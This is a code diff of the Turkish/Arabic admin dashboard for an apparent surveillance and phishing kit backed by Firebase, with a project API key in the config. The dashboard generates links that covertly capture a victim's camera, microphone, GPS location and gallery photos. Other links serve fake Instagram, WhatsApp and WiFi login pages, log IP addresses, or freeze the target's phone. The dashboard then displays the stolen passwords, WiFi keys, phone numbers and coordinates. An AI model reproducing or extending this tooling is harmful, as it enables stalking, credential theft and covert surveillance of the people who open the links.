-    const fc = { apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao", authDomain: "camerahhh-15487.firebaseapp.com", projectId: "camerahhh-15487", storageBucket: "camerahhh-15487.firebasestorage.app", messagingSenderId: "212849652224", appId: "1:212849652224:web:19d8a85c01cd81005bdee5", measurementId: "G-WDVJV36W7X" };
-    const app = initializeApp(fc);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
-    const BASE = location.origin + location.pathname.replace(/\/[^/]*$/, '');
-
-    // TAM ARAPÇA ÇEVİRİ
-    const TR = {
-        access:"ONLINE",statCaptures:"ÇEKİMLER",statMedia:"MEDYA",
-        panelCamera:"KAMERA",labelDuration:"SÜRE",panelInsta:"INSTAGRAM KAMERA",labelInstaDuration:"INSTA SÜRE",
-        panelHack:"HACK ARAÇLARI",panelLocations:"KONUMLAR",badgeLocations:"GPS",
-        panelWifi:"WIFI HESAPLAR",panelAccounts:"INSTAGRAM HESAPLAR",
-        btnPhoto1:"📸 FOTO",btnPhoto5:"📸 5FOTO",btnVideo:"🎬 VİDEO",btnAudio:"🎤 SES",btnVideoAudio:"🎬🎤 V+SES",
-        btnIgPhoto:"📸 FOTO",btnIgPhoto5:"📸 5FOTO",btnIgVideo:"🎬 VİDEO",btnIgAudio:"🎤 SES",btnIgVideoAudio:"🎬🎤 V+SES",
-        btnIpLogger:"📡 IP LOGGER",btnWaFake:"🔐 WHATSAPP",btnWifiFake:"📶 WIFI FAKE",btnIgFake:"📸 INSTAGRAM",btnLocation:"📍 KONUM",btnCrash:"💀 CRASH",
-        labelRefreshLoc:"YENİLE",labelClearLoc:"TEMİZLE",labelRefreshWifi:"YENİLE",labelClearWifi:"TEMİZLE",
-        labelRefreshAcc:"YENİLE",labelClearAcc:"TEMİZLE",labelRefreshAll:"TÜMÜNÜ YENİLE",labelClearAll:"TÜM ÇEKİMLERİ SİL",
-        logout:"⛧ ÇIKIŞ",copy:"KOPYALA",linkLabel:"🔗 LİNK",del:"SİL",dl:"İNDİR",dlAll:"TÜMÜNÜ İNDİR",
-        noData:"VERİ YOK",loading:"YÜKLENİYOR...",cDel:"Bu çekim silinsin mi?",cClearAll:"TÜM çekimler silinsin mi?",
-        cClearAcc:"Tüm IG hesapları silinsin mi?",cClearLoc:"Tüm konumlar silinsin mi?",cClearWifi:"Tüm WiFi hesapları silinsin mi?",
-        sec:"sn",photo:"FOTOĞRAF",photos:"5FOTO",video:"VİDEO",audio:"SES",va:"VİDEO+SES",
-        noAcc:"HENÜZ HESAP YOK",noAccD:"Sahte Instagram linkini gönderin",
-        noLoc:"HENÜZ KONUM YOK",noLocD:"Konum linkini gönderin",
-        noWifi:"HENÜZ WIFI YOK",noWifiD:"WiFi Fake linkini gönderin",
-        instaNote:"✅ Instagram WebView'dan Chrome'a otomatik geçer",crashWarn:"⚠️ Telefonu tamamen dondurur!",
-        locNote:"📍 Kurbandan GPS + adres bilgisi alır",wifiNote:"📶 WiFi şifresi ve telefon numarası toplar",
-        username:"Kullanıcı",password:"Şifre",ip:"IP",device:"Cihaz",accuracy:"Doğruluk",coords:"Koordinat",address:"Adres",
-        googleMaps:"🗺 Google Maps'te Aç",unknown:"Bilinmiyor",deleting:"SİLİNİYOR...",error:"HATA",
-        phone:"Telefon",wifiPass:"WiFi Şifre",ssid:"Ağ",secShort:"sn"
-    };
-
-    const AR = {
-        access:"متصل",statCaptures:"الالتقاطات",statMedia:"الوسائط",
-        panelCamera:"الكاميرا",labelDuration:"المدة",panelInsta:"كاميرا انستغرام",labelInstaDuration:"مدة انستا",
-        panelHack:"أدوات الاختراق",panelLocations:"المواقع",badgeLocations:"GPS",
-        panelWifi:"حسابات WiFi",panelAccounts:"حسابات انستغرام",
-        btnPhoto1:"📸 صورة",btnPhoto5:"📸 5 صور",btnVideo:"🎬 فيديو",btnAudio:"🎤 صوت",btnVideoAudio:"🎬🎤 فيديو+صوت",
-        btnIgPhoto:"📸 صورة",btnIgPhoto5:"📸 5 صور",btnIgVideo:"🎬 فيديو",btnIgAudio:"🎤 صوت",btnIgVideoAudio:"🎬🎤 فيديو+صوت",
-        btnIpLogger:"📡 مسجل IP",btnWaFake:"🔐 واتساب",btnWifiFake:"📶 WiFi وهمي",btnIgFake:"📸 انستغرام",btnLocation:"📍 موقع",btnCrash:"💀 تجميد",
-        labelRefreshLoc:"تحديث",labelClearLoc:"مسح",labelRefreshWifi:"تحديث",labelClearWifi:"مسح",
-        labelRefreshAcc:"تحديث",labelClearAcc:"مسح",labelRefreshAll:"تحديث الكل",labelClearAll:"مسح الالتقاطات",
-        logout:"⛧ خروج",copy:"نسخ",linkLabel:"🔗 الرابط",del:"حذف",dl:"تحميل",dlAll:"تحميل الكل",
-        noData:"لا بيانات",loading:"جاري التحميل...",cDel:"حذف هذا الالتقاط؟",cClearAll:"حذف جميع الالتقاطات؟",
-        cClearAcc:"حذف جميع حسابات IG؟",cClearLoc:"حذف جميع المواقع؟",cClearWifi:"حذف جميع حسابات WiFi؟",
-        sec:"ث",photo:"صورة",photos:"5 صور",video:"فيديو",audio:"صوت",va:"فيديو+صوت",
-        noAcc:"لا حسابات",noAccD:"أرسل رابط انستغرام الوهمي",
-        noLoc:"لا مواقع",noLocD:"أرسل رابط الموقع",
-        noWifi:"لا WiFi",noWifiD:"أرسل رابط WiFi الوهمي",
-        instaNote:"✅ تحويل تلقائي من انستغرام إلى كروم",crashWarn:"⚠️ يجمد الهاتف بالكامل!",
-        locNote:"📍 جمع GPS والعنوان من الضحية",wifiNote:"📶 جمع كلمة WiFi ورقم الهاتف",
-        username:"المستخدم",password:"كلمة المرور",ip:"IP",device:"الجهاز",accuracy:"الدقة",coords:"إحداثيات",address:"العنوان",
-        googleMaps:"🗺 فتح في خرائط جوجل",unknown:"غير معروف",deleting:"جاري المسح...",error:"خطأ",
-        phone:"هاتف",wifiPass:"كلمة WiFi",ssid:"شبكة",secShort:"ث"
-    };
-
-    let lang = localStorage.getItem('app_language') || 'tr';
-    let user = null;
-    let currentModalUrl = null;
-    function t(k) { return (lang === 'ar' ? AR : TR)[k] || TR[k]; }
-
-    function updateFlags() {
-        document.getElementById('langTrBtn').classList.toggle('active', lang === 'tr');
-        document.getElementById('langArBtn').classList.toggle('active', lang === 'ar');
-    }
-
-    // TÜM METİNLERİ GÜNCELLE
-    function applyLang() {
-        document.getElementById('accessText').innerText = t('access');
-        document.getElementById('statCaptures').innerText = t('statCaptures');
-        document.getElementById('statMedia').innerText = t('statMedia');
-        document.getElementById('panelCamera').innerText = t('panelCamera');
-        document.getElementById('labelDuration').innerText = t('labelDuration');
-        document.getElementById('panelInsta').innerText = t('panelInsta');
-        document.getElementById('labelInstaDuration').innerText = t('labelInstaDuration');
-        document.getElementById('panelHack').innerText = t('panelHack');
-        document.getElementById('panelLocations').innerText = t('panelLocations');
-        document.getElementById('badgeLocations').innerText = t('badgeLocations');
-        document.getElementById('panelWifi').innerText = t('panelWifi');
-        document.getElementById('panelAccounts').innerText = t('panelAccounts');
-        document.getElementById('btnPhoto1').innerText = t('btnPhoto1');
-        document.getElementById('btnPhoto5').innerText = t('btnPhoto5');
-        document.getElementById('btnVideo').innerText = t('btnVideo');
-        document.getElementById('btnAudio').innerText = t('btnAudio');
-        document.getElementById('btnVideoAudio').innerText = t('btnVideoAudio');
-        document.getElementById('btnIgPhoto').innerText = t('btnIgPhoto');
-        document.getElementById('btnIgPhoto5').innerText = t('btnIgPhoto5');
-        document.getElementById('btnIgVideo').innerText = t('btnIgVideo');
-        document.getElementById('btnIgAudio').innerText = t('btnIgAudio');
-        document.getElementById('btnIgVideoAudio').innerText = t('btnIgVideoAudio');
-        document.getElementById('btnIpLogger').innerText = t('btnIpLogger');
-        document.getElementById('btnWaFake').innerText = t('btnWaFake');
-        document.getElementById('btnWifiFake').innerText = t('btnWifiFake');
-        document.getElementById('btnIgFake').innerText = t('btnIgFake');
-        document.getElementById('btnLocation').innerText = t('btnLocation');
-        document.getElementById('btnCrash').innerText = t('btnCrash');
-        document.getElementById('labelRefreshLoc').innerText = t('labelRefreshLoc');
-        document.getElementById('labelClearLoc').innerText = t('labelClearLoc');
-        document.getElementById('labelRefreshWifi').innerText = t('labelRefreshWifi');
-        document.getElementById('labelClearWifi').innerText = t('labelClearWifi');
-        document.getElementById('labelRefreshAcc').innerText = t('labelRefreshAcc');
-        document.getElementById('labelClearAcc').innerText = t('labelClearAcc');
-        document.getElementById('labelRefreshAll').innerText = t('labelRefreshAll');
-        document.getElementById('labelClearAll').innerText = t('labelClearAll');
-        document.getElementById('logoutBtn').innerText = t('logout');
-        document.getElementById('durationValue').innerText = document.getElementById('videoDuration').value + t('secShort');
-        document.getElementById('igDurationValue').innerText = document.getElementById('igVideoDuration').value + t('secShort');
-        document.body.classList.toggle('rtl', lang === 'ar');
-        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-        document.documentElement.lang = lang === 'ar' ? 'ar' : 'tr';
-        updateFlags();
-        if (user) { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); }
-    }
-
-    document.getElementById('videoDuration').oninput = function() {
-        document.getElementById('durationValue').innerText = this.value + t('secShort');
-    };
-    document.getElementById('igVideoDuration').oninput = function() {
-        document.getElementById('igDurationValue').innerText = this.value + t('secShort');
-    };
-    document.getElementById('langTrBtn').onclick = () => { lang = 'tr'; localStorage.setItem('app_language', lang); applyLang(); };
-    document.getElementById('langArBtn').onclick = () => { lang = 'ar'; localStorage.setItem('app_language', lang); applyLang(); };
-
-    // ============ VERİ YÜKLEME ============
-    
-    async function loadCaptures() {
-        if (!user) return;
-        const div = document.getElementById('capturesList');
-        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
-        try {
-            const snap = await getDocs(query(collection(db, "captures"), where("userId", "==", user.uid)));
-            let data = []; let tm = 0;
-            snap.forEach(d => { const x = d.data(); data.push({ id: d.id, ...x }); tm += (x.media?.length || 0); });
-            data.sort((a, b) => (b.unix || 0) - (a.unix || 0));
-            document.getElementById('captureCount').innerText = data.length;
-            document.getElementById('mediaCount').innerText = tm;
-            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noData')} ]</div>`; return; }
-            let h = '';
-            for (let it of data) {
-                const date = new Date(it.timestamp);
-                let mode = ''; switch(it.mode) { case 'photo': mode = t('photo'); break; case '5photos': mode = t('photos'); break; case 'videoonly': mode = t('video'); break; case 'audio': mode = t('audio'); break; case 'videoaudio': mode = t('va'); break; default: mode = it.mode; }
-                let mh = '';
-                for (let m of it.media || []) {
-                    const iv = m.match(/\.(mp4|webm|mov)/i);
-                    if (iv) mh += `<video src="${m}" onclick="openMedia('${m}',true)"></video>`;
-                    else mh += `<img src="${m}" onclick="openMedia('${m}',false)">`;
-                }
-                h += `<div class="media-card">
-                    <div class="media-card-header"><span class="media-card-ip">🌐 IP: ${it.ip || t('unknown')}</span><span class="media-card-time">⛧ ${date.toLocaleString(lang==='ar'?'ar-SA':'tr-TR')} | ${mode} ${it.duration?'('+it.duration+t('secShort')+')':''}</span></div>
-                    <div class="media-strip">${mh}</div>
-                    <div class="media-card-footer">
-                        <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(it.media||[]).replace(/"/g,'&quot;')})">⬇ ${t('dlAll')}</button>
-                        <button class="btn-delete" onclick="delCapture('${it.id}')">🗑 ${t('del')}</button>
-                    </div></div>`;
-            }
-            div.innerHTML = h;
-        } catch(e) { div.innerHTML = `<div class="error-text">❌ ${e.message}</div>`; }
-    }
-
-    async function loadAccounts() {
-        if (!user) return;
-        const div = document.getElementById('accountsList');
-        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
-        try {
-            const snap = await getDocs(query(collection(db, "ig_accounts"), where("ownerId", "==", user.uid)));
-            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
-            data.sort((a, b) => (b.timestamp||'').localeCompare(a.timestamp||''));
-            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noAcc')} ]<span class="empty-desc">${t('noAccD')}</span></div>`; return; }
-            let h = '';
-            for (let a of data) {
-                h += `<div class="acc-card"><div class="acc-header"><span class="acc-user">👤 ${a.username||t('unknown')}</span><span class="acc-time">⛧ ${a.timestamp?new Date(a.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="acc-row">🔑 ${t('password')}: <span>${a.password||t('unknown')}</span></div><div class="acc-row">🌐 ${t('ip')}: <span>${a.ip||t('unknown')}</span></div></div>`;
-            }
-            div.innerHTML = h;
-        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
-    }
-
-    async function loadLocations() {
-        if (!user) return;
-        const div = document.getElementById('locationsList');
-        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
-        try {
-            const snap = await getDocs(query(collection(db, "locations"), where("userId", "==", user.uid)));
-            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
-            data.sort((a, b) => (b.unix||0) - (a.unix||0));
-            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noLoc')} ]<span class="empty-desc">${t('noLocD')}</span></div>`; return; }
-            let h = '';
-            for (let l of data) {
-                h += `<div class="loc-card"><div class="loc-header"><span class="loc-coords">📍 ${l.latitude?.toFixed(5)}, ${l.longitude?.toFixed(5)}</span><span class="loc-time">⛧ ${l.timestamp?new Date(l.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="loc-address">🏠 ${l.address||t('unknown')}</div><div class="loc-details"><span>🌐 ${t('ip')}: ${l.ip||t('unknown')}</span><span>📏 ${t('accuracy')}: ${l.accuracy?l.accuracy+'m':t('unknown')}</span></div><a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank" class="btn-maps">${t('googleMaps')}</a></div>`;
-            }
-            div.innerHTML = h;
-        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
-    }
-
-    async function loadWifi() {
-        if (!user) return;
-        const div = document.getElementById('wifiList');
-        div.innerHTML = `<div class="loading-text">⟳ ${t('loading')}</div>`;
-        try {
-            const snap = await getDocs(query(collection(db, "wifi_logs"), where("ownerId", "==", user.uid)));
-            const data = []; snap.forEach(d => data.push({ id: d.id, ...d.data() }));
-            data.sort((a, b) => (b.unix||0) - (a.unix||0));
-            if (!data.length) { div.innerHTML = `<div class="empty-text">[ ${t('noWifi')} ]<span class="empty-desc">${t('noWifiD')}</span></div>`; return; }
-            let h = '';
-            for (let w of data) {
-                h += `<div class="wifi-card"><div class="wifi-header"><span class="wifi-ssid">📶 ${w.ssid||t('unknown')}</span><span class="wifi-time">⛧ ${w.timestamp?new Date(w.timestamp).toLocaleString(lang==='ar'?'ar-SA':'tr-TR'):'N/A'}</span></div><div class="wifi-row">📱 ${t('phone')}: <span>${w.phone||t('unknown')}</span></div><div class="wifi-row">🔑 ${t('wifiPass')}: <span>${w.wifiPassword||t('unknown')}</span></div><div class="wifi-row">🌐 ${t('ip')}: <span>${w.ip||t('unknown')}</span></div></div>`;
-            }
-            div.innerHTML = h;
-        } catch(e) { div.innerHTML = `<div class="error-text">${t('error')}: ${e.message}</div>`; }
-    }
-
-    // ============ SİLME ============
-    async function clearColl(coll, field, val, confirmMsg, reloadFn) {
-        if (!user || !confirm(confirmMsg)) return;
-        const snap = await getDocs(query(collection(db, coll), where(field, "==", val)));
-        await Promise.all([...snap.docs].map(d => deleteDoc(doc(db, coll, d.id))));
-        await reloadFn();
-    }
-
-    window.delCapture = async (id) => { if (!confirm(t('cDel'))) return; await deleteDoc(doc(db, "captures", id)); await loadCaptures(); };
-    
-    window.downloadAllMedia = async (urls) => {
-        for (let u of urls) {
-            const a = document.createElement('a');
-            a.href = u;
-            a.download = u.split('/').pop()?.split('?')[0] || 'media';
-            a.target = '_blank';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            await new Promise(r => setTimeout(r, 300));
-        }
-    };
-
-    // MODAL: Aç + İndir butonu
-    window.openMedia = (url, isVideo) => {
-        currentModalUrl = url;
-        const modal = document.getElementById('modal');
-        const content = document.getElementById('modalContent');
-        const dlBtn = document.getElementById('modalDownloadBtn');
-        
-        if (isVideo) content.innerHTML = `<video src="${url}" controls autoplay style="max-width:94%;max-height:88%;border-radius:14px;"></video>`;
-        else content.innerHTML = `<img src="${url}" style="max-width:94%;max-height:88%;border-radius:14px;cursor:default;">`;
-        
-        dlBtn.style.display = 'block';
-        dlBtn.onclick = () => {
-            const a = document.createElement('a');
-            a.href = currentModalUrl;
-            a.download = currentModalUrl.split('/').pop()?.split('?')[0] || 'download';
-            a.target = '_blank';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+        const TR = {
+            access:"ONLINE",statCaptures:"ÇEKİMLER",statMedia:"MEDYA",
+            panelCamera:"KAMERA",labelDuration:"SÜRE",panelInsta:"INSTAGRAM KAMERA",labelInstaDuration:"INSTA SÜRE",
+            panelHack:"HACK ARAÇLARI",panelLocations:"KONUMLAR",badgeLocations:"GPS",
+            panelWifi:"WIFI HESAPLAR",panelAccounts:"INSTAGRAM HESAPLAR",panelGallery:"GALERİ HACK",
+            labelGalleryCount:"GALERİ SAYISI",
+            btnPhoto1:"FOTO",btnPhoto5:"5FOTO",btnVideo:"VİDEO",btnAudio:"SES",btnVideoAudio:"V+SES",
+            btnIgPhoto:"FOTO",btnIgPhoto5:"5FOTO",btnIgVideo:"VİDEO",btnIgAudio:"SES",btnIgVideoAudio:"V+SES",
+            btnIpLogger:"IP LOGGER",btnWaFake:"WHATSAPP",btnWifiFake:"WIFI FAKE",btnIgFake:"INSTAGRAM",btnLocation:"KONUM",btnGallery:"GALERİ",btnCrash:"CRASH",
+            labelRefreshLoc:"YENİLE",labelClearLoc:"TEMİZLE",labelRefreshWifi:"YENİLE",labelClearWifi:"TEMİZLE",
+            labelRefreshAcc:"YENİLE",labelClearAcc:"TEMİZLE",labelRefreshGallery:"YENİLE",labelClearGallery:"TEMİZLE",
+            labelRefreshAll:"TÜMÜNÜ YENİLE",labelClearAll:"TÜM ÇEKİMLERİ SİL",
+            logout:"ÇIKIŞ",copy:"KOPYALA",linkLabel:"LİNK",del:"SİL",dl:"İNDİR",dlAll:"TÜMÜNÜ İNDİR",
+            noData:"VERİ YOK",loading:"YÜKLENİYOR...",cDel:"Bu çekim silinsin mi?",cClearAll:"TÜM çekimler silinsin mi?",
+            cClearAcc:"Tüm IG hesapları silinsin mi?",cClearLoc:"Tüm konumlar silinsin mi?",cClearWifi:"Tüm WiFi hesapları silinsin mi?",cClearGallery:"Tüm galeri verileri silinsin mi?",
+            sec:"sn",photo:"FOTOĞRAF",photos:"5FOTO",video:"VİDEO",audio:"SES",va:"VİDEO+SES",
+            noAcc:"HENÜZ HESAP YOK",noAccD:"Sahte Instagram linkini gönderin",
+            noLoc:"HENÜZ KONUM YOK",noLocD:"Konum linkini gönderin",
+            noWifi:"HENÜZ WIFI YOK",noWifiD:"WiFi Fake linkini gönderin",
+            noGallery:"HENÜZ GALERİ VERİSİ YOK",noGalleryD:"Galeri hack linkini gönderin",
+            instaNote:"Instagram WebView'dan Chrome'a otomatik geçer",crashWarn:"Telefonu tamamen dondurur!",
+            locNote:"Kurbandan GPS + adres bilgisi alır",wifiNote:"WiFi şifresi ve telefon numarası toplar",
+            galleryNote:"Kurbandan galeri fotoğraflarını toplar",
+            username:"Kullanıcı",password:"Şifre",ip:"IP",device:"Cihaz",accuracy:"Doğruluk",coords:"Koordinat",address:"Adres",
+            googleMaps:"Google Maps'te Aç",unknown:"Bilinmiyor",deleting:"SİLİNİYOR...",error:"HATA",
+            phone:"Telefon",wifiPass:"WiFi Şifre",ssid:"Ağ",secShort:"sn",
+            galleryCount:"Fotoğraf Sayısı",galleryPhotos:"Fotoğraflar"
         };
-        
-        modal.style.display = 'flex';
-    };
 
-    function closeModal() {
-        document.getElementById('modal').style.display = 'none';
-        document.getElementById('modalContent').innerHTML = '';
-        document.getElementById('modalDownloadBtn').style.display = 'none';
-        currentModalUrl = null;
-    }
+        const AR = {
+            access:"متصل",statCaptures:"الالتقاطات",statMedia:"الوسائط",
+            panelCamera:"الكاميرا",labelDuration:"المدة",panelInsta:"كاميرا انستغرام",labelInstaDuration:"مدة انستا",
+            panelHack:"أدوات الاختراق",panelLocations:"المواقع",badgeLocations:"GPS",
+            panelWifi:"حسابات WiFi",panelAccounts:"حسابات انستغرام",panelGallery:"اختراق المعرض",
+            labelGalleryCount:"عدد الصور",
+            btnPhoto1:"صورة",btnPhoto5:"5 صور",btnVideo:"فيديو",btnAudio:"صوت",btnVideoAudio:"فيديو+صوت",
+            btnIgPhoto:"صورة",btnIgPhoto5:"5 صور",btnIgVideo:"فيديو",btnIgAudio:"صوت",btnIgVideoAudio:"فيديو+صوت",
+            btnIpLogger:"مسجل IP",btnWaFake:"واتساب",btnWifiFake:"WiFi وهمي",btnIgFake:"انستغرام",btnLocation:"موقع",btnGallery:"معرض",btnCrash:"تجميد",
+            labelRefreshLoc:"تحديث",labelClearLoc:"مسح",labelRefreshWifi:"تحديث",labelClearWifi:"مسح",
+            labelRefreshAcc:"تحديث",labelClearAcc:"مسح",labelRefreshGallery:"تحديث",labelClearGallery:"مسح",
+            labelRefreshAll:"تحديث الكل",labelClearAll:"مسح الالتقاطات",
+            logout:"خروج",copy:"نسخ",linkLabel:"الرابط",del:"حذف",dl:"تحميل",dlAll:"تحميل الكل",
+            noData:"لا بيانات",loading:"جاري التحميل...",cDel:"حذف هذا الالتقاط؟",cClearAll:"حذف جميع الالتقاطات؟",
+            cClearAcc:"حذف جميع حسابات IG؟",cClearLoc:"حذف جميع المواقع؟",cClearWifi:"حذف جميع حسابات WiFi؟",cClearGallery:"حذف جميع بيانات المعرض؟",
+            sec:"ث",photo:"صورة",photos:"5 صور",video:"فيديو",audio:"صوت",va:"فيديو+صوت",
+            noAcc:"لا حسابات",noAccD:"أرسل رابط انستغرام الوهمي",
+            noLoc:"لا مواقع",noLocD:"أرسل رابط الموقع",
+            noWifi:"لا WiFi",noWifiD:"أرسل رابط WiFi الوهمي",
+            noGallery:"لا بيانات معرض",noGalleryD:"أرسل رابط اختراق المعرض",
+            instaNote:"تحويل تلقائي من انستغرام إلى كروم",crashWarn:"يجمد الهاتف بالكامل!",
+            locNote:"جمع GPS والعنوان من الضحية",wifiNote:"جمع كلمة WiFi ورقم الهاتف",
+            galleryNote:"جمع صور المعرض من الضحية",
+            username:"المستخدم",password:"كلمة المرور",ip:"IP",device:"الجهاز",accuracy:"الدقة",coords:"إحداثيات",address:"العنوان",
+            googleMaps:"فتح في خرائط جوجل",unknown:"غير معروف",deleting:"جاري المسح...",error:"خطأ",
+            phone:"هاتف",wifiPass:"كلمة WiFi",ssid:"شبكة",secShort:"ث",
+            galleryCount:"عدد الصور",galleryPhotos:"الصور"
+        };
 
-    document.getElementById('modal').addEventListener('click', function(e) {
-        if (e.target === this) closeModal();
-    });
-    document.getElementById('modalClose').addEventListener('click', closeModal);
+        let lang = localStorage.getItem('app_language') || 'tr';
+        let user = null;
+        let currentModalUrl = null;
 
-    // ============ LİNK OLUŞTURMA ============
-    function genLink(mode, isIg = false) {
-        if (!user) return;
-        let url = `${BASE}/?mode=${mode}&uid=${user.uid}`;
-        if (['videoonly','videoaudio','audio'].includes(mode)) {
-            url += `&duration=${isIg ? document.getElementById('igVideoDuration').value : document.getElementById('videoDuration').value}`;
+        function t(k) { return (lang === 'ar' ? AR : TR)[k] || TR[k]; }
+
+        function updateFlags() {
+            document.getElementById('langTrBtn').classList.toggle('active', lang === 'tr');
+            document.getElementById('langArBtn').classList.toggle('active', lang === 'ar');
         }
-        if (isIg) url += '&force_chrome=1';
-        const div = isIg ? document.getElementById('outputInsta') : document.getElementById('outputCamera');
-        div.innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
-        if (isIg) div.innerHTML += `<span class="output-note red">${t('instaNote')}</span>`;
-    }
 
-    function genHack(type) {
-        if (!user) return;
-        let url = '', note = '', cls = '';
-        switch(type) {
-            case 'ip': url = `${BASE}/hack/iplogger.html?uid=${user.uid}&redirect=https://google.com`; break;
-            case 'wa': url = `${BASE}/hack/fakewhatsapp.html?uid=${user.uid}`; break;
-            case 'wifi': url = `${BASE}/hack/fake_wifi.html?uid=${user.uid}`; note = t('wifiNote'); cls = 'cyan-link'; break;
-            case 'ig': url = `${BASE}/hack/instagram_login.html?uid=${user.uid}`; break;
-            case 'loc': url = `${BASE}/?mode=location&uid=${user.uid}`; note = t('locNote'); cls = 'cyan-link'; break;
-            case 'crash': url = `${BASE}/hack/ariha_hacker.html`; note = t('crashWarn'); cls = 'crash-link'; break;
+        function applyLang() {
+            document.getElementById('accessText').innerText = t('access');
+            document.getElementById('statCaptures').innerText = t('statCaptures');
+            document.getElementById('statMedia').innerText = t('statMedia');
+            document.getElementById('panelCamera').innerText = t('panelCamera');
+            document.getElementById('labelDuration').innerText = t('labelDuration');
+            document.getElementById('panelInsta').innerText = t('panelInsta');
+            document.getElementById('labelInstaDuration').innerText = t('labelInstaDuration');
+            document.getElementById('panelHack').innerText = t('panelHack');
+            document.getElementById('panelLocations').innerText = t('panelLocations');
+            document.getElementById('badgeLocations').innerText = t('badgeLocations');
+            document.getElementById('panelWifi').innerText = t('panelWifi');
+            document.getElementById('panelAccounts').innerText = t('panelAccounts');
+            document.getElementById('panelGallery').innerText = t('panelGallery');
+            document.getElementById('labelGalleryCount').innerText = t('labelGalleryCount');
+            document.getElementById('btnPhoto1').innerHTML = `<i class="fa-solid fa-image"></i> ${t('btnPhoto1')}`;
+            document.getElementById('btnPhoto5').innerHTML = `<i class="fa-solid fa-images"></i> ${t('btnPhoto5')}`;
+            document.getElementById('btnVideo').innerHTML = `<i class="fa-solid fa-video"></i> ${t('btnVideo')}`;
+            document.getElementById('btnAudio').innerHTML = `<i class="fa-solid fa-microphone"></i> ${t('btnAudio')}`;
+            document.getElementById('btnVideoAudio').innerHTML = `<i class="fa-solid fa-video"></i><i class="fa-solid fa-microphone"></i> ${t('btnVideoAudio')}`;
+            document.getElementById('btnIgPhoto').innerHTML = `<i class="fa-solid fa-image"></i> ${t('btnIgPhoto')}`;
+            document.getElementById('btnIgPhoto5').innerHTML = `<i class="fa-solid fa-images"></i> ${t('btnIgPhoto5')}`;
+            document.getElementById('btnIgVideo').innerHTML = `<i class="fa-solid fa-video"></i> ${t('btnIgVideo')}`;
+            document.getElementById('btnIgAudio').innerHTML = `<i class="fa-solid fa-microphone"></i> ${t('btnIgAudio')}`;
+            document.getElementById('btnIgVideoAudio').innerHTML = `<i class="fa-solid fa-video"></i><i class="fa-solid fa-microphone"></i> ${t('btnIgVideoAudio')}`;
+            document.getElementById('btnIpLogger').innerHTML = `<i class="fa-solid fa-satellite-dish"></i> ${t('btnIpLogger')}`;
+            document.getElementById('btnWaFake').innerHTML = `<i class="fa-brands fa-whatsapp"></i> ${t('btnWaFake')}`;
+            document.getElementById('btnWifiFake').innerHTML = `<i class="fa-solid fa-wifi"></i> ${t('btnWifiFake')}`;
+            document.getElementById('btnIgFake').innerHTML = `<i class="fa-brands fa-instagram"></i> ${t('btnIgFake')}`;
+            document.getElementById('btnLocation').innerHTML = `<i class="fa-solid fa-location-dot"></i> ${t('btnLocation')}`;
+            document.getElementById('btnGallery').innerHTML = `<i class="fa-solid fa-images"></i> ${t('btnGallery')}`;
+            document.getElementById('btnCrash').innerHTML = `<i class="fa-solid fa-skull-crossbones"></i> ${t('btnCrash')}`;
+            document.getElementById('labelRefreshLoc').innerText = t('labelRefreshLoc');
+            document.getElementById('labelClearLoc').innerText = t('labelClearLoc');
+            document.getElementById('labelRefreshWifi').innerText = t('labelRefreshWifi');
+            document.getElementById('labelClearWifi').innerText = t('labelClearWifi');
+            document.getElementById('labelRefreshAcc').innerText = t('labelRefreshAcc');
+            document.getElementById('labelClearAcc').innerText = t('labelClearAcc');
+            document.getElementById('labelRefreshGallery').innerText = t('labelRefreshGallery');
+            document.getElementById('labelClearGallery').innerText = t('labelClearGallery');
+            document.getElementById('labelRefreshAll').innerText = t('labelRefreshAll');
+            document.getElementById('labelClearAll').innerText = t('labelClearAll');
+            document.getElementById('logoutBtn').innerHTML = `<i class="fa-solid fa-right-from-bracket"></i> ${t('logout')}`;
+            document.getElementById('durationValue').innerText = document.getElementById('videoDuration').value + t('secShort');
+            document.getElementById('igDurationValue').innerText = document.getElementById('igVideoDuration').value + t('secShort');
+            document.body.classList.toggle('rtl', lang === 'ar');
+            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+            document.documentElement.lang = lang === 'ar' ? 'ar' : 'tr';
+            updateFlags();
+            if (user) { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); loadGallery(); }
         }
-        document.getElementById('outputHack').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" class="${cls}">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>${note?`<span class="output-note ${type==='crash'?'red':'cyan'}">${note}</span>`:''}`;
-    }
 
-    // ============ EVENTLER ============
-    document.getElementById('btnPhoto1').onclick = () => genLink('photo');
-    document.getElementById('btnPhoto5').onclick = () => genLink('5photos');
-    document.getElementById('btnVideo').onclick = () => genLink('videoonly');
-    document.getElementById('btnAudio').onclick = () => genLink('audio');
-    document.getElementById('btnVideoAudio').onclick = () => genLink('videoaudio');
-    
-    document.getElementById('btnIgPhoto').onclick = () => genLink('photo', true);
-    document.getElementById('btnIgPhoto5').onclick = () => genLink('5photos', true);
